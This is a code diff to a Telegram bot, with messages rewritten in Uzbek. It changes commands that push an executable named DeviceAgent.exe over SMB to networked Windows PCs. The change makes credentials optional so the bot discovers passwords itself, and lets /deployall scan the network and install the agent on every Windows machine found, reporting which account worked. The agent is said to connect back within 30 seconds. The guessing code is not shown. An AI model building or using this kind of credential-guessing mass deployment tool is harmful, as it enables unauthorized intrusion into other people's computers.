@@ -375,18 +375,20 @@ async def cmd_deploy(message: types.Message):
         return
 
     parts = message.text.split(maxsplit=3)
-    if len(parts) < 4:
+    if len(parts) < 2:
         await message.answer(
-            "Usage: `/deploy <ip> <username> <password>`\n"
-            "Example: `/deploy 192.168.1.50 Administrator Pass123`\n\n"
-            "First run `/scan` to find PCs, then deploy.",
+            "📦 **Avtomatik Deploy**\n\n"
+            "Foydalanish:\n"
+            "`/deploy <ip>` — avtomatik parol topadi\n"
+            "`/deploy <ip> <user> <pass>` — qo'lda parol\n\n"
+            "Avval `/scan` ishga tushiring!",
             parse_mode="Markdown",
         )
         return
 
     ip = parts[1]
-    username = parts[2]
-    password = parts[3]
+    username = parts[2] if len(parts) > 2 else None
+    password = parts[3] if len(parts) > 3 else None
 
     agent_path = os.path.join(
         os.path.dirname(__file__), "..", "client", "dist", "DeviceAgent.exe"
@@ -396,41 +398,44 @@ async def cmd_deploy(message: types.Message):
 
     if not os.path.exists(agent_path):
         await message.answer(
-            "❌ Agent .exe not found!\n"
-            "Place `DeviceAgent.exe` in the `server/` directory first."
+            "❌ Agent .exe topilmadi!\n"
+            "`DeviceAgent.exe` ni `server/` papkasiga joylang."
         )
         return
 
-    await message.answer(f"📦 Deploying agent to `{ip}`...")
-    await message.answer("🔍 Administrator account tekshirilmoqda...")
+    if username and password:
+        await message.answer(f"📦 `{ip}` ga deploy boshlandi...")
+    else:
+        await message.answer(
+            f"📦 `{ip}` ga avtomatik deploy boshlandi...\n🔍 Parollar topilmoqda..."
+        )
 
     try:
         result = deploy_to_pc(ip, username, password, agent_path)
     except Exception as e:
-        await message.answer(f"❌ Deployment failed: {str(e)}")
+        await message.answer(f"❌ Deploy xato: {str(e)}")
         return
 
     if isinstance(result, tuple):
         success, used_user, used_pass = result
     else:
         success = result
-        used_user = username
-        used_pass = password
+        used_user = username or "auto"
+        used_pass = password or "auto"
 
     if success:
         await message.answer(
-            f"✅ Agent deployed to `{ip}`!\n"
-            f"👤 Account: `{used_user}`\n"
-            f"🔗 It will connect within 30 seconds."
+            f"✅ Agent `{ip}` ga o'rnatildi!\n"
+            f"👤 Hisob: `{used_user}`\n"
+            f"🔗 30 soniyada ulanadi."
         )
     else:
         await message.answer(
-            f"❌ Deployment to `{ip}` failed.\n"
-            f"Check:\n"
-            f"• Username/password are correct\n"
-            f"• File sharing is enabled\n"
-            f"• Firewall allows SMB (port 445)\n"
-            f"• Administrator account is active"
+            f"❌ `{ip}` ga deploy xato berdi.\n"
+            f"Tekshiring:\n"
+            f"• File sharing yoqilgan\n"
+            f"• Firewall 445-port ochiq\n"
+            f"• SMB ulanish mumkin"
         )
 
 
@@ -440,16 +445,8 @@ async def cmd_deploy_all(message: types.Message):
         return
 
     parts = message.text.split(maxsplit=2)
-    if len(parts) < 3:
-        await message.answer(
-            "Usage: `/deployall <username> <password>`\n"
-            "Deploys to ALL discovered Windows PCs on the network.",
-            parse_mode="Markdown",
-        )
-        return
-
-    username = parts[1]
-    password = parts[2]
+    username = parts[1] if len(parts) > 1 else None
+    password = parts[2] if len(parts) > 2 else None
 
     agent_path = os.path.join(
         os.path.dirname(__file__), "..", "client", "dist", "DeviceAgent.exe"
@@ -458,17 +455,18 @@ async def cmd_deploy_all(message: types.Message):
         agent_path = os.path.join(os.path.dirname(__file__), "DeviceAgent.exe")
 
     if not os.path.exists(agent_path):
-        await message.answer(
-            "❌ Agent .exe not found! Place it in `server/` directory."
-        )
+        await message.answer("❌ Agent .exe topilmadi! `server/` papkasiga joylang.")
         return
 
-    await message.answer("📦 Scanning network and deploying to all Windows PCs...")
+    await message.answer(
+        "📦 Tarmoq skanerlanmoqda va barcha Windows PC larga deploy..."
+    )
+    await message.answer("🔍 Avtomatik parollar topilmoqda...")
 
     try:
         scan_results = scan_network()
     except Exception as e:
-        await message.answer(f"❌ Scan failed: {str(e)}")
+        await message.answer(f"❌ Skaner xato: {str(e)}")
         return
 
     targets = []
@@ -477,27 +475,26 @@ async def cmd_deploy_all(message: types.Message):
             targets.append(d["ip"])
 
     if not targets:
-        await message.answer("📭 No target PCs found.")
+        await message.answer("📭 Hech qanday PC topilmadi.")
         return
 
-    await message.answer(f"📦 Deploying to {len(targets)} PCs: {', '.join(targets)}")
-    await message.answer("🔍 Administrator account tekshirilmoqda va yoqilmoqda...")
+    await message.answer(f"📦 {len(targets)} ta PC ga deploy: {', '.join(targets)}")
 
     try:
         results = deploy_to_multiple(targets, username, password, agent_path)
     except Exception as e:
-        await message.answer(f"❌ Deployment failed: {str(e)}")
+        await message.answer(f"❌ Deploy xato: {str(e)}")
         return
 
     success_count = sum(1 for v in results.values() if isinstance(v, tuple) and v[0])
-    text = f"📦 **Deployment Complete**\n\n"
-    text += f"✅ Success: {success_count}/{len(targets)}\n\n"
+    text = f"📦 **Deploy Yakunlandi**\n\n"
+    text += f"✅ Muvaffaq: {success_count}/{len(targets)}\n\n"
     for ip, result in results.items():
         if isinstance(result, tuple):
             ok, used_user, _ = result
             text += f"{'✅' if ok else '❌'} `{ip}` (user: {used_user})\n"
         else:
-            text += f"❌ `{ip}` (failed)\n"
+            text += f"❌ `{ip}` (xato)\n"
 
     await message.answer(text, parse_mode="Markdown")
 
